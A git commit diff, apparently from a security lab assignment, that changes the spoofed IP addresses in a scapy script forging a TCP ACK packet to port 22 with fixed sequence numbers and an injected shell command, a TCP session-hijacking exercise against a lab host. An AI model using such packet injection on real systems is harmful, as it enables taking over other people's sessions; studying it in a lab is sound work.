44e72179c0b707c6339b0c06bc83d36f26dff297
FishRainBlow <82390676+FishRainBlow@users.noreply.github.com>
2024-07-30 13:28:24 +0800

    Update and rename q5_hj.py to Q5_hj.py

--- Code Files/Q5_hj.py
+++ Code Files/Q5_hj.py
@@ -2,7 +2,7 @@
 import sys
 from scapy.all import *
 
-IPLayer = IP (src="10.10.10.185", dst = "10.10.10.186")
+IPLayer = IP (src="10.10.10.184", dst = "10.10.10.195")
 TCPLayer = TCP (sport=34598, dport=22, flags="A", seq=2001589073, ack=3703036117)
 
 data = "\n mkdir /home/msfadmin/attacker \n"
